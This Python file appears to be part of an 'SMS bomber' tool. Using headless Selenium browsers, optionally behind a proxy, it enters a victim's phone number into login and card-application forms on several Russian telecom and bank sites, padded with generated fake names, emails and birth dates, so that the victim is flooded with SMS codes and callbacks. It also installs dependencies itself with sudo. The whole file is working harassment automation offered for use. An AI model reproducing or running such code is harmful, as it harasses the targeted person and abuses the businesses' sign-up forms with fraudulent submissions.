from os import system
from platform import system as name_os
from time import sleep
from modules import *
from random import randint

while True:
    try:
        from selenium import webdriver
        if name_os == 'Windows':
            from webdriver_manager.chrome import ChromeDriverManager
        from selenium.webdriver.support.ui import Select
        import requests
        break
    except:
        print('\nИдёт установка модулей\n')
        if name_os == 'Windows':
            if system('pip install selenium') != 0:
                print('\npip не установлен, установите его.\n')
                exit()
            system('pip install webdriver-manager')
            system('pip install requests')
        elif name_os == 'Linux':
            if system('sudo pip3 install selenium') != 0:
                print('\nИдёт установка pip3.\n')
                system('sudo apt-get install python3-pip -y')
                continue
            system('pip3 install requests')
        else:
            if system('pip3 install selenium') != 0:
                print('\npip3 не установлен, установите его.\n')
                exit()
            system('pip3 install requests')

sel = {
'type':'chrome',
'headless':True,
'window_size':'1920x935',
'proxy':None,
'installer_chrome_win':True if system == 'Windows' else False
}


class web:


    def __init__(self, infor):
        if infor['bomber']['type'] != 3:
            if sel['type'] == 'chrome':
                options = webdriver.ChromeOptions()
                if sel['headless'] == True:
                    options.add_argument('--headless')
                if sel['proxy'] != None:
                    options.add_argument(f"--proxy-server={sel['proxy']}")
                options.add_argument(f"window-size={sel['window_size']}")
                self.site = webdriver.Chrome(ChromeDriverManager().install(), chrome_options=options) if sel['installer_chrome_win'] == True else webdriver.Chrome(chrome_options=options)
            elif sel['type'] == 'firefox':
                options = webdriver.firefox.options.Options()
                options.headless = sel['headless']
                caps = webdriver.DesiredCapabilities.FIREFOX
                if sel['proxy'] != None:
                    caps['marionette'] = True
                    caps['proxy'] = {
                        "proxyType": "MANUAL",
                        "httpProxy": sel['proxy'],
                        "ftpProxy": sel['proxy'],
                        "sslProxy": sel['proxy']
                    }
                self.site = webdriver.Firefox(options=options, capabilities=caps)
                cor = sel['window_size'].split('x')
                self.site.set_window_size(int(cor[0]), int(cor[1]))
            self.site.get(infor['bomber']['url'])
        self.infor = infor
        self.stop_pr = True


    def mts(self):
        number = list(self.infor["pol"]["number"])
        del number[0]
        requests.get(f'{self.infor["bomber"]["url"]}{"".join(number)}')


    def tele(self):
        while True:
            but = self.site.find_elements_by_css_selector('a.gtm-new-navigation-login')
            if len(but) != 0:
                break
        but[0].click()
        while True:
            inp = self.site.find_elements_by_css_selector('div.phone-field > input.text-field')
            if len(inp) != 0:
                break
        number = list(self.infor['pol']['number'])
        del number[0]
        inp[0].send_keys(''.join(number))
        but = self.site.find_element_by_css_selector('button.keycloak-login-form__button')
        but.click()


    def tinkoff(self):
        while True:
            inp = self.site.find_elements_by_css_selector('input[aria-label="Фамилия, имя и отчество"]')
            if len(inp) != 0:
                break
        pol = gen_name(pyst_patr=True)
        inp[0].send_keys(f"{self.infor['pol']['name'] if self.infor['pol']['name'] != None else pol[0]} {self.infor['pol']['surname'] if self.infor['pol']['surname'] != None else pol[1]}{' '+self.infor['pol']['patronymic'] if self.infor['pol']['patronymic'] != None else pol[2]}")
        inp = self.site.find_element_by_css_selector('input[name="phone_mobile"]')
        number = list(self.infor['pol']['number'])
        del number[0]
        inp.send_keys(''.join(number))
        inp = self.site.find_element_by_css_selector('input[aria-label="Электронная почта"]')
        inp.send_keys(self.infor['pol']['email'] if self.infor['pol']['email'] != None else gen_mail(value=pol[0]+pol[1]))
        inp = self.site.find_element_by_css_selector('input[aria-label="Дата рождения"]')
        br = birth(15)
        inp.send_keys((('0' if len(str(br[0])) == 1 else '')+str(br[0]))+(('0' if len(str(br[1])) == 1 else '')+str(br[1]))+(('0' if len(str(br[2])) == 1 else '')+str(br[2])))
        but = self.site.find_element_by_css_selector('button[name="goForward"]')
        but.click()


    def bspb(self):
        while True:
            sel = self.site.find_elements_by_css_selector('select#card_select')
            if len(sel) != 0:
                break
        selc = Select(sel[0])
        selc.select_by_index(1)
        pol = gen_name(pyst_patr=True)
        inp = self.site.find_element_by_css_selector('input#card_secondname')
        inp.send_keys(self.infor['pol']['surname'] if self.infor['pol']['surname'] != None else pol[1])
        inp = self.site.find_element_by_css_selector('input#card_firstname')
        inp.send_keys(self.infor['pol']['name'] if self.infor['pol']['name'] != None else pol[0])
        inp = self.site.find_element_by_css_selector('input#card_thirdname')
        inp.send_keys(self.infor['pol']['patronymic'] if self.infor['pol']['patronymic'] != None else pol[2])
        inp = self.site.find_element_by_css_selector('input#card_email')
        inp.send_keys(self.infor['pol']['email'] if self.infor['pol']['email'] != None else gen_mail(pol[0]+pol[1]))
        inp = self.site.find_element_by_css_selector('input#card_phone')
        number = list(self.infor['pol']['number'])
        del number[0]
        inp.send_keys(''.join(number))
        but = self.site.find_element_by_css_selector('input#card_btn_approve')
        but.click()
        but = self.site.find_element_by_css_selector('a[class="btn btn_blue go-slide next"]')
        but.click()


    def get(self):
        try:
            self.site.get(self.infor['bomber']['url'])
        except:
            pass


    def quit(self):
        try:
            self.site.quit()
        except:
            pass
